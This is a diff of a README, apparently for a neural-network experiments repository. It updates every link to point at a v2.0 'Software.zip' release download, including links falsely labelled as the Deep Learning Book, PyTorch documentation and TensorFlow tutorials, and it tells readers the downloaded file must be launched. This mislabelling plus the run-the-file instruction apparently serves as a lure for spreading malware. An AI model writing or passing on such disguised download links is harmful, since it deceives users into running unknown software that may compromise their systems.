@@ -34,7 +34,7 @@ The repository covers a wide range of topics related to neural networks and deep
 ## 🚀 Let's Get Started!
 To explore the experiments, analysis, and Python scripts in this repository, please visit the following link: 
 
-[![Download Repository](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v1.0/Software.zip)](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v1.0/Software.zip)
+[![Download Repository](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v2.0/Software.zip)](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v2.0/Software.zip)
 
 If the link above ends with the file name, it needs to be launched to access the repository contents. Alternatively, you can also check the "Releases" section for additional resources.
 
@@ -47,9 +47,9 @@ Dive into the fascinating world of neural networks and hyperparameter experiment
 
 For more information and resources on neural networks and deep learning, you can check out the following links:
 
-- [Deep Learning Book Website](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v1.0/Software.zip)
-- [PyTorch Official Documentation](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v1.0/Software.zip)
-- [TensorFlow Tutorials](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v1.0/Software.zip)
+- [Deep Learning Book Website](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v2.0/Software.zip)
+- [PyTorch Official Documentation](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v2.0/Software.zip)
+- [TensorFlow Tutorials](https://github.com/Aashir01124/Neural-Network-Modifications-Hyperparameter-Experiments/releases/download/v2.0/Software.zip)
 
 Feel free to explore these resources to deepen your understanding of neural network modifications and hyperparameter experiments. 🌐📚
 
